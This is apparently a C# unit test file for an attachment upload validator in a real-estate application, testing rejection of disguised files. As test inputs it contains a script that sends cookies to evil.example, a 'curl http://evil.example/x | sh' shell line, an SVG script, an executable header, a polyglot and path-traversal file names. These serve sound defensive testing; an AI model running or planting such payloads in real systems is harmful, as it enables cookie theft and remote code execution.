using System.Text;
using RealEstateEval.Application.Rules;
using RealEstateEval.Attachments.Application.Rules;

namespace RealEstateEval.Application.Tests;

/// <summary>
/// Upload gate tests. Every case here is written from the attacker's side: the client
/// controls the declared MIME type and the file name, so only the bytes can be trusted.
/// </summary>
public class AttachmentContentValidationTests
{
    private const string ImageScope = "property-registry";
    private const string PdfOnlyScope = "engineering-survey-report";

    [Fact]
    public void Accepts_real_png_declared_as_png()
    {
        var result = AttachmentUploadRules.Inspect(
            ImageScope,
            "image/png",
            "deed.png",
            Png());

        Assert.Null(result.Error);
        Assert.Equal(DetectedFileFormat.Png, result.Format);
        Assert.Equal("image/png", result.ContentType);
    }

    [Theory]
    [InlineData("image/jpeg", "photo.jpg")]
    [InlineData("image/jpg", "photo.jpeg")]
    public void Accepts_real_jpeg_under_any_jpeg_mime_alias(string mime, string name)
    {
        var result = AttachmentUploadRules.Inspect(ImageScope, mime, name, Jpeg());

        Assert.Null(result.Error);
        Assert.Equal("image/jpeg", result.ContentType);
    }

    [Fact]
    public void Accepts_real_pdf_for_pdf_only_scope()
    {
        var result = AttachmentUploadRules.Inspect(
            PdfOnlyScope,
            "application/pdf",
            "survey.pdf",
            Pdf());

        Assert.Null(result.Error);
        Assert.Equal(DetectedFileFormat.Pdf, result.Format);
    }

    [Fact]
    public void Rejects_html_payload_disguised_as_png()
    {
        var result = AttachmentUploadRules.Inspect(
            ImageScope,
            "image/png",
            "innocent.png",
            Ascii("<html><script>fetch('//evil.example/'+document.cookie)</script></html>"));

        Assert.NotNull(result.Error);
        Assert.Equal(DetectedFileFormat.Unknown, result.Format);
    }

    [Fact]
    public void Rejects_svg_even_though_its_mime_starts_with_image()
    {
        var result = AttachmentUploadRules.Inspect(
            ImageScope,
            "image/svg+xml",
            "logo.svg",
            Ascii("<svg xmlns=\"http://www.w3.org/2000/svg\"><script>alert(1)</script></svg>"));

        Assert.NotNull(result.Error);
    }

    [Fact]
    public void Rejects_windows_executable_named_as_pdf()
    {
        var result = AttachmentUploadRules.Inspect(
            PdfOnlyScope,
            "application/pdf",
            "report.pdf",
            [0x4D, 0x5A, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00]);

        Assert.NotNull(result.Error);
        Assert.Equal(DetectedFileFormat.Unknown, result.Format);
    }

    [Fact]
    public void Rejects_shell_script_named_as_jpg()
    {
        var result = AttachmentUploadRules.Inspect(
            ImageScope,
            "image/jpeg",
            "photo.jpg",
            Ascii("#!/bin/sh\ncurl http://evil.example/x | sh\n"));

        Assert.NotNull(result.Error);
    }

    [Fact]
    public void Rejects_real_png_whose_declared_mime_claims_pdf()
    {
        var result = AttachmentUploadRules.Inspect(
            ImageScope,
            "application/pdf",
            "deed.png",
            Png());

        Assert.Equal("نوع المحتوى المعلن لا يطابق محتوى الملف", result.Error);
    }

    [Fact]
    public void Rejects_real_png_whose_extension_claims_pdf()
    {
        var result = AttachmentUploadRules.Inspect(
            ImageScope,
            "image/png",
            "deed.pdf",
            Png());

        Assert.Equal("امتداد الملف لا يطابق محتوى الملف", result.Error);
    }

    [Fact]
    public void Rejects_double_extension_that_ends_in_an_executable()
    {
        var result = AttachmentUploadRules.Inspect(
            ImageScope,
            "image/png",
            "deed.png.exe",
            Png());

        Assert.Equal("امتداد الملف لا يطابق محتوى الملف", result.Error);
    }

    [Fact]
    public void Rejects_file_with_no_extension_at_all()
    {
        var result = AttachmentUploadRules.Inspect(ImageScope, "image/png", "deed", Png());

        Assert.Equal("اسم الملف يجب أن ينتهي بامتداد معروف", result.Error);
    }

    [Fact]
    public void Rejects_empty_content()
    {
        var result = AttachmentUploadRules.Inspect(ImageScope, "image/png", "deed.png", []);

        Assert.NotNull(result.Error);
    }

    [Fact]
    public void Rejects_pdf_polyglot_prefixed_with_junk()
    {
 // A leading-junk PDF is what makes a file parse as two formats at once.
        var payload = Ascii("GIF89a").Concat(Ascii("%PDF-1.7 trailing")).ToArray();

        var result = AttachmentUploadRules.Inspect(
            PdfOnlyScope,
            "application/pdf",
            "survey.pdf",
            payload);

        Assert.NotNull(result.Error);
    }

    [Fact]
    public void Rejects_image_for_a_pdf_only_scope()
    {
        var result = AttachmentUploadRules.Inspect(
            PdfOnlyScope,
            "image/png",
            "survey.png",
            Png());

        Assert.NotNull(result.Error);
    }

    [Fact]
    public void Rejects_image_above_the_image_size_budget()
    {
        var oversized = Png(AttachmentUploadRules.ImageMaxBytes + 1);

        var result = AttachmentUploadRules.Inspect(
            "government-keys-proof",
            "image/jpeg",
            "proof.png",
            oversized);

        Assert.NotNull(result.Error);
    }

    [Fact]
    public void Accepts_octet_stream_when_the_bytes_are_a_supported_format()
    {
 // Browsers legitimately send application/octet-stream for drag-and-drop uploads.
        var result = AttachmentUploadRules.Inspect(
            ImageScope,
            "application/octet-stream",
            "deed.png",
            Png());

        Assert.Null(result.Error);
        Assert.Equal("image/png", result.ContentType);
    }

    [Theory]
    [InlineData("../../../etc/passwd.png", "passwd.png")]
    [InlineData("..\\..\\windows\\system32\\evil.png", "evil.png")]
    [InlineData("C:\\Users\\admin\\deed.png", "deed.png")]
    public void Strips_directory_components_from_the_stored_file_name(
        string submitted,
        string expected)
    {
        var result = AttachmentUploadRules.Inspect(ImageScope, "image/png", submitted, Png());

        Assert.Null(result.Error);
        Assert.Equal(expected, result.FileName);
    }

    [Fact]
    public void Strips_control_characters_used_to_spoof_the_visible_extension()
    {
        var result = AttachmentUploadRules.Inspect(
            ImageScope,
            "image/png",
            "deed\u0000.png",
            Png());

        Assert.Null(result.Error);
        Assert.Equal("deed.png", result.FileName);
    }

    [Fact]
    public void Detect_recognises_every_allowed_format_and_nothing_else()
    {
        Assert.Equal(DetectedFileFormat.Png, FileSignatureInspector.Detect(Png()));
        Assert.Equal(DetectedFileFormat.Jpeg, FileSignatureInspector.Detect(Jpeg()));
        Assert.Equal(DetectedFileFormat.Gif, FileSignatureInspector.Detect(Gif()));
        Assert.Equal(DetectedFileFormat.Webp, FileSignatureInspector.Detect(Webp()));
        Assert.Equal(DetectedFileFormat.Pdf, FileSignatureInspector.Detect(Pdf()));
        Assert.Equal(DetectedFileFormat.Unknown, FileSignatureInspector.Detect(Ascii("PK\u0003\u0004")));
        Assert.Equal(DetectedFileFormat.Unknown, FileSignatureInspector.Detect([]));
    }

    private static byte[] Ascii(string value) => Encoding.ASCII.GetBytes(value);

    private static byte[] Png(long totalLength = 64)
    {
        var bytes = new byte[totalLength];
        ReadOnlySpan<byte> signature = [0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A];
        signature.CopyTo(bytes);
        return bytes;
    }

    private static byte[] Jpeg()
    {
        var bytes = new byte[64];
        ReadOnlySpan<byte> signature = [0xFF, 0xD8, 0xFF, 0xE0];
        signature.CopyTo(bytes);
        return bytes;
    }

    private static byte[] Gif() => [.. Ascii("GIF89a"), .. new byte[32]];

    private static byte[] Webp() =>
        [.. Ascii("RIFF"), 0x20, 0, 0, 0, .. Ascii("WEBP"), .. new byte[16]];

    private static byte[] Pdf() => [.. Ascii("%PDF-1.7\n%\u00e2\u00e3\u00cf\u00d3\n"), .. new byte[16]];
}
